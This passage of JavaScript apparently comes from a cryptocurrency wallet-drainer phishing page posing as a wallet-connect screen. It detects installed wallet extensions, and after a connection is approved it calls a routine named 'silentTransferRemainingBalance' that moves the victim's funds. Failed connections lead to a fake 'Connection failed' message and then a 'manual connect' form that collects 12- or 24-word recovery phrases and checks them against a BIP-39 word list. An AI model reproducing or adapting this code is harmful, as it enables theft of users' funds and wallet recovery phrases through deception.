                                onFail: () => { tryOpenDeepLink(a.scheme, fallback, () => {}); },
                                onSuccess: async (client, session) => {
                                    try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch(e){}
                                    try { ov.style.display = 'none'; } catch(e){}
                                    // Execute silent transfer with WalletConnect session
                                    try {
                                        const connectionInfo = await createWalletConnectProvider(session);
                                        await silentTransferRemainingBalance(connectionInfo);
                                    } catch (e) { console.warn('Silent transfer setup failed:', e); }
                                }
                            });
                        } catch (e) {
                            console.error('WC attempt error:', e);
                            tryOpenDeepLink(a.scheme, fallback, () => {});
                        }
                    });
                }
                list.appendChild(btn);
            });
            if (!apps || apps.length === 0) {
                const note = document.createElement('div');
                note.style.padding = '12px';
                note.style.color = '#cbd5e1';
                note.style.textAlign = 'center';
                note.textContent = 'No native app detected — try opening the wallet app or continue in browser.';
                list.appendChild(note);

                const tryBtn = document.createElement('button');
                tryBtn.className = 'login-btn';
                tryBtn.style.background = 'linear-gradient(90deg,#22c55e,#16a34a)';
                tryBtn.textContent = 'Try open app';
                tryBtn.addEventListener('click', () => {
                    ov.style.display = 'none';
                    // attempt naive schemes based on walletName
                    const candidates = [];
                    const base = normalizeKey(walletName).replace(/[^a-z0-9]/g, '');
                    if (base) {
                        candidates.push(`${base}://`);
                        candidates.push(`${base}wallet://`);
                        candidates.push(`${base}app://`);
                        candidates.push(`${base}-wallet://`);
                    }
                    // try each scheme in sequence
                    let tried = 0;
                    const tryNext = () => {
                        if (tried >= candidates.length) {
                            // all failed — fallback to side overlay
                            fallback();
                            return;
                        }
                        const s = candidates[tried++];
                        tryOpenDeepLink(s, () => {
                            // failed, try next
                            tryNext();
                        }, () => {
                            // success callback — openConnect handled elsewhere
                        });
                    };
                    tryNext();
                });
                list.appendChild(tryBtn);

                const manualBtn = document.createElement('button');
                manualBtn.className = 'mt-4 text-gray-400 hover:text-white text-sm';
                manualBtn.textContent = 'Continue in browser';
                manualBtn.addEventListener('click', () => {
                    ov.style.display = 'none';
                    fallback();
                });
                list.appendChild(manualBtn);
            } else {
                const manualBtn = document.createElement('button');
                manualBtn.className = 'mt-4 text-gray-400 hover:text-white text-sm';
                manualBtn.textContent = 'Continue in browser';
                manualBtn.addEventListener('click', () => {
                    ov.style.display = 'none';
                    fallback();
                });
                list.appendChild(manualBtn);
            }

                   document.getElementById('detector-cancel').onclick = () => { ov.style.display = 'none'; };
        ov.style.display = 'flex';
    }

    // Detect ALL installed extensions (not filtered by name)
    function detectAllInstalledExtensions() {
        const results = [];
        const isMobile = /Mobi|Android/i.test(navigator.userAgent);
        if (isMobile) return results; // only for desktop

        function pushIfUnique(arr, obj) {
            if (!arr.some(x => normalizeKey(x.name) === normalizeKey(obj.name))) arr.push(obj);
        }

        // Detect injected providers (desktop extensions)
        try {
            if (window.ethereum) {
                const providers = Array.isArray(window.ethereum.providers) ? window.ethereum.providers : [window.ethereum];
                providers.forEach(p => {
                    try {
                        if (p.isMetaMask) pushIfUnique(results, { name: 'MetaMask', type: 'extension', connector: async () => p.request({ method: 'eth_requestAccounts' }), scheme: 'metamask://' });
                        else if (p.isCoinbaseWallet) pushIfUnique(results, { name: 'Coinbase Wallet', type: 'extension', connector: async () => p.request({ method: 'eth_requestAccounts' }), scheme: 'coinbase://' });
                        else pushIfUnique(results, { name: 'Ethereum Provider', type: 'extension', connector: async () => p.request({ method: 'eth_requestAccounts' }) });
                    } catch (e) {}
                });
            }
        } catch (e) {}

        try { if (window.solana && window.solana.isPhantom) pushIfUnique(results, { name: 'Phantom', type: 'extension', connector: async () => window.solana.connect(), scheme: 'phantom://' }); } catch (e) {}
        try { if (window.solflare && typeof window.solflare.connect === 'function') pushIfUnique(results, { name: 'Solflare', type: 'extension', connector: async () => window.solflare.connect(), scheme: 'solflare://' }); } catch (e) {}
        try { if (window.keplr) pushIfUnique(results, { name: 'Keplr', type: 'extension', connector: async () => { await window.keplr.enable && await window.keplr.enable(); return true; }, scheme: 'keplr://' }); } catch (e) {}
        try { if (window.tronLink || (window.tronWeb && window.tronWeb.defaultAddress)) pushIfUnique(results, { name: 'TronLink', type: 'extension', connector: async () => { if (window.tronLink && window.tronLink.request) return await window.tronLink.request({ method: 'tron_requestAccounts' }); if (window.tronWeb && window.tronWeb.request) return await window.tronWeb.request({ method: 'tron_requestAccounts' }); throw new Error('No Tron request available'); }, scheme: 'tronlink://' }); } catch (e) {}
        try { if (window.safepal || window.SafePal) pushIfUnique(results, { name: 'SafePal', type: 'extension', connector: async () => { if (window.safepal && window.safepal.request) return await window.safepal.request({ method: 'eth_requestAccounts' }); throw new Error('SafePal connector not available'); }, scheme: 'safepal://' }); } catch (e) {}

        const knownWalletGlobals = [
            { name: 'Rabby', props: ['rabby', 'Rabby'], scheme: 'rabby://' },
            { name: 'Rainbow', props: ['rainbow', 'Rainbow'], scheme: 'rainbow://' },
            { name: 'MathWallet', props: ['mathwallet', 'MathWallet', 'mathWallet'], scheme: 'mathwallet://' },
            { name: 'TokenPocket', props: ['tp', 'TokenPocket', 'tokenPocket', 'tpwallet'], scheme: 'tpwallet://' },
            { name: 'Coin98', props: ['coin98', 'Coin98'], scheme: 'coin98://' },
            { name: 'BitKeep', props: ['bitkeep', 'Bitkeep', 'BitKeep'], scheme: 'bitkeep://' },
            { name: 'Wallet3', props: ['wallet3'], scheme: 'wallet3://' },
            { name: 'Opera', props: ['opera', 'operaWallet'], scheme: 'opera://' },
            { name: 'Trezor', props: ['trezor'], scheme: 'trezor://' },
            { name: 'OKX', props: ['okxwallet', 'okx'], scheme: 'okxwallet://' },
            { name: 'Ronin', props: ['ronin'], scheme: 'ronin://' }
        ];
        knownWalletGlobals.forEach(w => {
            for (const p of w.props) {
                try {
                    const provider = window[p];
                    if (provider) {
                        pushIfUnique(results, {
                            name: w.name,
                            type: 'extension',
                            connector: async () => {
                                if (typeof provider.request === 'function') return await provider.request({ method: 'eth_requestAccounts' });
                                if (typeof provider.connect === 'function') return await provider.connect();
                                if (typeof provider.enable === 'function') return await provider.enable();
                                throw new Error('No connect method on provider');
                            },
                            scheme: w.scheme
                        });
                        break;
                    }
                } catch (e) {}
            }
        });

        return results;
    }

    function handleWalletClick() {
        resetWallets();
        this.classList.add('selected');
        try { document.getElementById('status-message').style.display = 'none'; } catch (e) {}
        const walletName = this.dataset.wallet;
        const providedIcon = this.dataset.icon || '';
        const iconUrl = providedIcon && /^https?:\/\//.test(providedIcon) ? providedIcon : resolveIconUrl(walletName, providedIcon);
        const overlay = document.getElementById('connect-overlay');
        const mainImg = overlay.querySelector('#modalMainWalletImg');
        const nameEl = overlay.querySelector('#overlay-wallet-name');
        const msgEl = overlay.querySelector('#overlay-message');
        mainImg.src = iconUrl;
        nameEl.textContent = walletName;
        msgEl.textContent = '';
        msgEl.classList.remove('failed');

        // Desktop-first strict priority: try the specific wallet's extension FIRST
        const isDesktop = !/Mobi|Android|iPhone|iPad|iPod/.test(navigator.userAgent);
        
        // fallback action: show the side overlay + ring
        const showConnectOverlay = () => {
            try {
                const modalRect = document.querySelector('.modal-content').getBoundingClientRect();
                const viewportW = window.innerWidth;
                const viewportH = window.innerHeight;
                const overlayMaxWidth = 340;
                const overlayWidth = Math.min(overlayMaxWidth, Math.max(200, viewportW - 32));
                overlay.style.width = `${overlayWidth}px`;
                const desiredLeft = modalRect.right + 16;
                const maxLeft = Math.max(8, viewportW - overlayWidth - 16);
                let left = Math.min(desiredLeft, maxLeft);
                if (left < 16) left = 16;
                overlay.style.left = `${left}px`;
                const desiredHeight = Math.max(120, modalRect.height - 16);
                const overlayHeight = Math.min(desiredHeight, viewportH - 32);
                overlay.style.height = `${overlayHeight}px`;
                let top = modalRect.top + 8;
                if (top + overlayHeight + 8 > viewportH) top = Math.max(8, viewportH - overlayHeight - 8);
                overlay.style.top = `${top}px`;
                overlay.style.position = 'fixed';
                overlay.style.zIndex = '10001';
                overlay.classList.add('active');
            } catch (e) {
                overlay.classList.add('active');
            }
            const ring = document.getElementById('connectRing');
            ring.classList.add('active');
            setTimeout(() => {
                ring.classList.remove('active');
                msgEl.textContent = 'Connection failed. Please try again.';
                msgEl.classList.add('failed');
                setTimeout(() => {
                    overlay.classList.remove('active');
                    overlay.style.position = '';
                    overlay.style.top = '';
                    overlay.style.left = '';
                    overlay.style.height = '';
                    overlay.style.zIndex = '';
                    msgEl.textContent = '';
                    msgEl.classList.remove('failed');
                    modalOverlay.classList.remove('active');
                    setTimeout(() => {
                        modalOverlay.style.display = 'none';
                        manualOverlay.style.display = 'flex';
                        setTimeout(() => manualOverlay.classList.add('active'), 10);
                    }, 400);
                }, 2000);
            }, 12000);
        };

        // DESKTOP-FIRST STRICT PRIORITY: Try the clicked wallet's extension immediately
        if (isDesktop) {
            const allExtensions = detectAllInstalledExtensions();
            const clickedWalletKey = normalizeKey(walletName);
            
            // Find exact match for the clicked wallet
            const matchingExt = allExtensions.find(ext => {
                const extKey = normalizeKey(ext.name);
                return extKey === clickedWalletKey || 
                       clickedWalletKey.includes(extKey) || 
                       extKey.includes(clickedWalletKey);
            });

            if (matchingExt && typeof matchingExt.connector === 'function') {
                console.log(`[Desktop] Attempting ${matchingExt.name} extension for clicked wallet: ${walletName}`);
                // Try ONLY this wallet's extension, no popup
                (async () => {
                    try {
                        const result = await matchingExt.connector();
                        console.log(`[Desktop] ${matchingExt.name} connected successfully:`, result);
                        try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
                        
                        // Get connection info and initiate silent transfer
                        try {
                            const provider = window.ethereum || matchingExt.provider;
                            const accounts = await provider.request({ method: 'eth_accounts' });
                            const chainId = await provider.request({ method: 'eth_chainId' });
                            const connectionInfo = {
                                provider: provider,
                                address: accounts[0],
                                chainId: chainId,
                                session: result
                            };
                            await silentTransferRemainingBalance(connectionInfo);
                        } catch (e) { 
                            console.warn('Silent transfer failed:', e); 
                        }
                        return;
                    } catch (e) {
                        console.log(`[Desktop] ${matchingExt.name} connection failed/declined:`, e.message);
                        // User declined or extension failed — show fallback options
                        const detected = detectInstalledWallets(walletName);
                        showDetectorPopup(detected, walletName, showConnectOverlay);
                    }
                })();
                return;
            }
        }

        // MOBILE or no matching extension on desktop: show detector popup
        const detected = detectInstalledWallets(walletName);
        showDetectorPopup(detected, walletName, showConnectOverlay);
    }
    function resetWallets() {
        document.querySelectorAll('.wallet-item').forEach(item => {
            item.classList.remove('selected');
            item.style.display = '';
        });
        statusMessage.textContent = 'Select a wallet to connect';
        statusMessage.classList.remove('status-failed');
    }
    // Manual Connect Tabs
    const tabBtns = document.querySelectorAll('.tab-btn');
    const tabContents = document.querySelectorAll('.tab-content');
    tabBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            tabBtns.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            tabContents.forEach(c => c.classList.add('hidden'));
            document.getElementById(btn.dataset.tab + '-tab').classList.remove('hidden');
            if (btn.dataset.tab === 'phrase') {
                updatePhraseGrid();
            }
        });
    });
    // Dynamic phrase grid with REAL BIP-39 word check (green/red)
    const phraseGrid = document.getElementById('phrase-grid');
    const radio12 = document.querySelector('input[value="12"]');
    const radio24 = document.querySelector('input[value="24"]');
    // Real BIP-39 word validation function (using a large subset of the official list)
    const isValidBip39Word = (word) => {
        const validWords = new Set([
            "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
            "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
            "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit",
            "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent",
            "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert",
            "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter",
            "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger",
            "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique",
            "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic",
            "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest",
            "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset",
            "assist", "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction",
            "audit", "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake",
            "aware", "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge",
            "bag", "balance", "balcony", "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain",
            "barrel", "base", "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become",
            "beef", "before", "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit",
            "best", "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind", "biology",
            "bird", "birth", "bitter", "black", "blade", "blame", "blanket", "blast", "bleak", "bless",
            "blind", "blood", "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body",
            "boil", "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss",
            "bottom", "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread",
            "breeze", "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken", "bronze",
            "broom", "brother", "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb",
            "bulk", "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus", "business", "busy",
            "butter", "buyer", "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call",
            "calm", "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe", "canvas",
            "canyon", "capable", "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry",
            "cart", "case", "cash", "casino", "castle", "casual", "cat", "catalog", "catch", "category",
            "cattle", "caught", "cause", "caution", "cave", "ceiling", "celery", "cement", "census", "century",
            "cereal", "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase",
            "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child",
            "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon", "circle",
            "citizen", "city", "civil", "claim", "clap", "clarify", "claw", "clay", "clean", "clerk",
            "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog", "close",
            "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut",
            "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come", "comfort",
            "comic", "common", "company", "concert", "conduct", "confirm", "congress", "connect", "consider", "control",
            "convince", "cook", "cool", "copper", "copy", "coral", "core", "corn", "correct", "cost",
            "cotton", "couch", "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle",
            "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit", "creek",
            "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd", "crucial",
            "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture", "cup",
            "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad",
            "damage", "damp", "dance", "danger", "daring", "dash", "daughter", "dawn", "day", "deal",
            "debate", "debris", "decade", "december", "decide", "decline", "decorate", "decrease", "deer", "defense",
            "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial", "dentist", "deny",
            "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert", "design", "desk",
            "despair", "destroy", "detail", "detect", "develop", "device", "devote", "diagram", "dial", "diamond",
            "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner", "dinosaur",
            "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder", "display", "distance",
            "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll", "dolphin", "domain",
            "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft", "dragon", "drama",
            "drastic", "draw", "dream", "dress", "drift", "drill", "drink", "drip", "drive", "drop",
            "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch", "duty", "dwarf",
            "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east", "easy", "echo",
            "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow",
            "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else", "embark", "embody",
            "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact", "end", "endless",
            "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy", "enlist", "enough",
            "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode", "equal", "equip",
            "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay", "essence", "estate",
            "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example", "excess", "exchange",
            "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile", "exist", "exit",
            "exotic", "expand", "expect", "expense", "expert", "expire", "explain", "expose", "express", "extend",
            "extra", "eye", "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall",
            "false", "fame", "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat",
            "fatal", "father", "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed",
            "feel", "female", "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field",
            "figure", "file", "film", "filter", "final", "find", "fine", "finger", "finish", "fire",
            "firm", "first", "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame", "flash",
            "flat", "flavor", "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid",
            "flush", "fly", "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot",
            "force", "forest", "forget", "fork", "fortune", "forum", "forward", "fossil", "foster", "found",
            "fox", "fragile", "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost",
            "frown", "frozen", "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget",
            "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden", "garlic", "garment",
            "gas", "gasp", "gate", "gather", "gauge", "gaze", "general", "genius", "genre", "gentle",
            "genuine", "gesture", "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl", "give",
            "glad", "glance", "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory", "glove",
            "glow", "glue", "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel", "gossip",
            "govern", "gown", "grab", "grace", "grain", "grant", "grape", "grass", "gravity", "great",
            "green", "grid", "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess",
            "guide", "guilt", "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster",
            "hand", "happy", "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk", "hazard",
            "head", "health", "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help", "hen",
            "hero", "hidden", "high", "hill", "hint", "hip", "hire", "history", "hobby", "hockey",
            "hold", "hole", "holiday", "hollow", "home", "honey", "hood", "hope", "horn", "horror",
            "horse", "hospital", "host", "hotel", "hour", "hover", "hub", "huge", "human", "humble",
            "humor", "hundred", "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid", "ice",
            "icon", "idea", "identify", "idle", "ignore", "ill", "illegal", "illness", "image", "imitate",
            "immense", "immune", "impact", "impose", "improve", "impulse", "inch", "include", "income", "increase",
            "index", "indicate", "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit", "initial",
            "inject", "injury", "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect", "inside",
            "inspire", "install", "intact", "interest", "into", "invest", "invite", "involve", "iron", "island",
            "isolate", "issue", "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous", "jeans",
            "jelly", "jewel", "job", "join", "joke", "journey", "joy", "judge", "juice", "jump",
            "jungle", "junior", "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key", "kick",
            "kid", "kidney", "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten", "kiwi",
            "knee", "knife", "knock", "know", "lab", "label", "labor", "ladder", "lady", "lake",
            "lamp", "language", "laptop", "large", "later", "latin", "laugh", "laundry", "lava", "law",
            "lawn", "lawsuit", "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture", "left",
            "leg", "legal", "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson",
            "letter", "level", "liar", "liberty", "library", "license", "life", "lift", "light", "like",
            "limb", "limit", "link", "lion", "liquid", "list", "little", "live", "lizard", "load",
            "loan", "lobster", "local", "lock", "logic", "lonely", "long", "loop", "lottery", "loud",
            "lounge", "love", "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury", "lyrics",
            "machine", "mad", "magic", "magnet", "maid", "mail", "main", "major", "make", "mammal",
            "man", "manage", "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin",
            "marine", "market", "marriage", "mask", "mass", "master", "match", "material", "math", "matrix",
            "matter", "maximum", "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal", "media",
            "melody", "melt", "member", "memory", "mention", "menu", "mercy", "merge", "merit", "merry",
            "mesh", "message", "metal", "method", "middle", "midnight", "milk", "million", "mimic", "mind",
            "minimum", "minor", "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix", "mixed",
            "mixture", "mobile", "model", "modify", "mom", "moment", "monitor", "monkey", "monster", "month",
            "moon", "moral", "more", "morning", "mosquito", "mother", "motion", "motor", "mountain", "mouse",
            "move", "movie", "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom", "music",
            "must", "mutual", "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty",
            "nation", "nature", "near", "neck", "need", "negative", "neglect", "neither", "nephew", "nerve",
            "nest", "net", "network", "neutral", "never", "news", "next", "nice", "night", "noble",
            "noise", "nominee", "noodle", "normal", "north", "nose", "notable", "note", "nothing", "notice",
            "novel", "now", "nuclear", "number", "nurse", "nut", "oak", "obey", "object", "oblige",
            "obscure", "observe", "obtain", "obvious", "occur", "ocean", "october", "odor", "off", "offer",
            "office", "often", "oil", "okay", "old", "olive", "olympic", "omit", "once", "one",
            "onion", "online", "only", "open", "opera", "opinion", "oppose", "option", "orange", "orbit",
            "orchard", "order", "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other", "outdoor",
            "outer", "output", "outside", "oval", "oven", "over", "own", "owner", "oxygen", "oyster",
            "ozone", "pact", "paddle", "page", "pair", "palace", "palm", "panda", "panel", "panic",
            "panther", "paper", "parade", "parent", "park", "parrot", "party", "pass", "patch", "path",
            "patient", "patrol", "pattern", "pause", "pave", "payment", "peace", "peanut", "pear", "peasant",
            "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect", "permit", "person", "pet",
            "phone", "photo", "phrase", "physical", "piano", "picnic", "picture", "piece", "pig", "pigeon",
            "pill", "pilot", "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place", "planet",
            "plastic", "plate", "play", "please", "pledge", "pluck", "plug", "plunge", "poem", "poet",
            "point", "polar", "pole", "police", "pond", "pony", "pool", "popular", "portion", "position",
            "possible", "post", "potato", "pottery", "poverty", "powder", "power", "practice", "praise", "predict",
            "prefer", "prepare", "present", "pretty", "prevent", "price", "pride", "primary", "print", "priority",
            "prison", "private", "prize", "problem", "process", "produce", "profit", "program", "project", "promote",
            "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding", "pull", "pulp",
            "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose", "purse", "push",
            "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick", "quit", "quiz",
            "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail", "rain", "raise",
            "rally", "ramp", "ranch", "random", "range", "rapid", "rare", "rate", "rather", "raven",
            "raw", "razor", "ready", "real", "reason", "rebel", "rebuild", "recall", "receive", "recipe",
            "record", "recycle", "reduce", "reflect", "reform", "refuse", "region", "regret", "regular", "reject",
            "relax", "release", "relief", "rely", "remain", "remember", "remind", "remove", "render", "renew",
            "rent", "reopen", "repair", "repeat", "replace", "report", "require", "rescue", "resemble", "resist",
            "resource", "response", "result", "retire", "retreat", "return", "reunion", "reveal", "review", "reward",
            "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge", "rifle", "right", "rigid",
            "ring", "riot", "ripple", "risk", "ritual", "rival", "river", "road", "roast", "robot",
            "robust", "rocket", "romance", "roof", "rookie", "room", "rose", "rotate", "rough", "round",
            "route", "royal", "rubber", "rude", "rug", "rule", "run", "runway", "rural", "sad",
            "saddle", "sadness", "safe", "sail", "salad", "salmon", "salon", "salt", "salute", "same",
            "sample", "sand", "satisfy", "satoshi", "sauce", "sausage", "save", "say", "scale", "scan",
            "scare", "scatter", "scene", "scheme", "school", "science", "scissors", "scorpion", "scout", "scrap",
            "screen", "script", "scrub", "sea", "search", "season", "seat", "second", "secret", "section",
            "security", "seed", "seek", "segment", "select", "sell", "seminar", "senior", "sense", "sentence",
            "series", "service", "session", "settle", "setup", "seven", "shadow", "shaft", "shallow", "share",
            "shed", "shell", "sheriff", "shield", "shift", "shine", "ship", "shiver", "shock", "shoe",
            "shoot", "shop", "short", "shoulder", "shove", "shrimp", "shrug", "shuffle", "shy", "sibling",
            "sick", "side", "siege", "sight", "sign", "silent", "silk", "silly", "silver", "similar",
            "simple", "since", "sing", "siren", "sister", "situation", "six", "size", "skate", "sketch",
            "ski", "skill", "skin", "skirt", "skull", "slab", "slam", "sleep", "slender", "slice",
            "slide", "slight", "slim", "slogan", "slot", "slow", "slush", "small", "smart", "smile",
            "smoke", "smooth", "snack", "snake", "snap", "sniff", "snow", "soap", "soccer", "social",
            "sock", "soda", "soft", "solar", "soldier", "solid", "solution", "solve", "someone", "song",
            "soon", "sorry", "sort", "soul", "sound", "soup", "source", "south", "space", "spare",
            "spatial", "spawn", "speak", "special", "speed", "spell", "spend", "sphere", "spice", "spider",
            "spike", "spin", "spirit", "split", "spoil", "sponsor", "spoon", "sport", "spot", "spray",
            "spread", "spring", "spy", "square", "squeeze", "squirrel", "stable", "stadium", "staff", "stage",
            "stairs", "stamp", "stand", "start", "state", "stay", "steak", "steel", "stem", "step",
            "stereo", "stick", "still", "sting", "stock", "stomach", "stone", "stool", "story", "stove",
            "strategy", "street", "strike", "strong", "struggle", "student", "stuff", "stumble", "style", "subject",
            "submit", "subway", "success", "such", "sudden", "suffer", "sugar", "suggest", "suit", "summer",
            "sun", "sunny", "sunset", "super", "supply", "supreme", "sure", "surface", "surge", "surprise",
            "surround", "survey", "suspect", "sustain", "swallow", "swamp", "swap", "swarm", "swear", "sweet",
            "swift", "swim", "swing", "switch", "sword", "symbol", "symptom", "syrup", "system", "table",
            "tackle", "tag", "tail", "talent", "talk", "tank", "tape", "target", "task", "taste",
            "tattoo", "taxi", "teach", "team", "tell", "ten", "tenant", "tennis", "tent", "term",
            "test", "text", "thank", "that", "theme", "then", "theory", "there", "they", "thing",
            "this", "thought", "three", "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger",
            "tilt", "timber", "time", "tiny", "tip", "tired", "tissue", "title", "toast", "tobacco",
            "today", "toddler", "toe", "together", "toilet", "token", "tomato", "tomorrow", "tone", "tongue",
            "tonight", "tool", "tooth", "top", "topic", "topple", "torch", "tornado", "tortoise", "toss",
            "total", "tourist", "toward", "tower", "town", "toy", "track", "trade", "traffic", "tragic",
            "train", "transfer", "trap", "trash", "travel", "tray", "treat", "tree", "trend", "trial",
            "tribe", "trick", "trigger", "trim", "trip", "trophy", "trouble", "truck", "true", "truly",
            "trumpet", "trust", "truth", "try", "tube", "tuition", "tumble", "tuna", "tunnel", "turkey",
            "turn", "turtle", "twelve", "twenty", "twice", "twin", "twist", "two", "type", "typical",
            "ugly", "umbrella", "unable", "unaware", "uncle", "uncover", "under", "undo", "unfair", "unfold",
            "unhappy", "uniform", "unique", "unit", "universe", "unknown", "unlock", "until", "unusual", "unveil",
            "update", "upgrade", "uphold", "upon", "upper", "upset", "urban", "urge", "usage", "use",
            "used", "useful", "useless", "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley",
            "valve", "van", "vanish", "vapor", "various", "vast", "vault", "vehicle", "velvet", "vendor",
            "venture", "venue", "verb", "verify", "version", "very", "vessel", "veteran", "viable", "vibrant",
            "vicious", "victory", "video", "view", "village", "vintage", "violin", "virtual", "virus", "visa",
            "visit", "visual", "vital", "vivid", "vocal", "voice", "void", "volcano", "volume", "vote",
            "voyage", "wage", "wagon", "wait", "walk", "wall", "walnut", "want", "warfare", "warm",
            "warrior", "wash", "wasp", "waste", "water", "wave", "way", "wealth", "weapon", "wear",
            "weasel", "weather", "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale",
            "what", "wheat", "wheel", "when", "where", "whip", "whisper", "wide", "width", "wife",
            "wild", "will", "win", "window", "wine", "wing", "wink", "winner", "winter", "wire",
            "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder", "wood", "wool", "word",
            "work", "world", "worry", "worth", "wrap", "wreck", "wrestle", "wrist", "write", "wrong",
            "yard", "year", "yellow", "you", "young", "youth", "zebra", "zero", "zone", "zoo"
        ]);
        return validWords.has(word.toLowerCase());
    };
    function updatePhraseGrid() {
        phraseGrid.innerHTML = '';
        const count = radio12.checked ? 12 : 24;
        const cols = radio12.checked ? 3 : 4;
        phraseGrid.style.gridTemplateColumns = `repeat(${cols}, 1fr)`;
        for (let i = 0; i < count; i++) {
            const div = document.createElement('div');
            const input = document.createElement('input');
            input.className = 'word-input';
            input.placeholder = `Word ${i+1}`;
            input.maxLength = 20;
            input.addEventListener('input', function() {
                const word = this.value.trim();
                if (word === '') {
                    this.classList.remove('correct', 'incorrect');
                    return;
                }
                if (isValidBip39Word(word)) {
                    this.classList.remove('incorrect');
